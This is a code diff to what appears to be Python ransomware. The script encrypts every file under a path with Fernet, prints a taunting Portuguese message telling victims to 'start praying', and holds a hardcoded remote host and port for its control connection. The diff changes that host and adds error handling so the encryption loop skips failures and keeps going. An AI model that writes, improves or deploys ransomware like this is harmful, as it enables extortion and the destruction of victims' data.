@@ -6,7 +6,7 @@ import subprocess
 import os
 from cryptography.fernet import Fernet
 
-_HOST = '192.168.100.165'
+_HOST = '192.168.8.185'
 _PORT = 9991
 _MAX_MSG_SIZE = 4096
 
@@ -162,7 +162,10 @@ if __name__ == "__main__":
                                 print('{}Começando a criptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
 
                                 for filename in discover(crypt_path):
-                                    crypt_file(filename, key, 'encrypt')
+                                    try:
+                                        crypt_file(filename, key, 'encrypt')
+                                    except:
+                                        continue
                                 print('{}Se quiser ver seus dados novamente, comece a rezar!{}'.format(cores['red'], cores['limpa']))
 
 
@@ -174,7 +177,10 @@ if __name__ == "__main__":
                                 print('{}Começando a descriptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
 
                                 for filename in discover(crypt_path):
-                                    crypt_file(filename, key, 'decrypt')
+                                    try:
+                                        crypt_file(filename, key, 'decrypt')
+                                    except:
+                                        continue
                                 print('{}Arquivos descriptografados > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
 
 
